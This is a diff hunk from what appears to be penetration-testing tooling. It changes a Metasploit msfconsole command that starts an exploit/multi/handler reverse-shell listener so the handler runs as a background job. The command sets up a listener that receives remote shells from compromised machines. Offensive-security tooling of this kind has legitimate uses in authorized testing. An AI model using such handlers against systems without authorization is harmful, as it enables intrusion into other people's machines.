@@ -43,6 +43,6 @@ LPORT="$(pick_free_port "$BOUND")" || {
 
 echo "handler: LPORT=$LPORT payload=$PAYLOAD LHOST=$LHOST (egress-friendly, free on VM)" >&2
 bash "$VAULT/scripts/vm-scan.sh" --win msf "$ENG" "$LHOST" \
-  "msfconsole -q -x \"use exploit/multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; run\"" >&2
+  "msfconsole -q -x \"use exploit/multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; run -j\"" >&2
 
 printf '%s\n' "$LPORT"
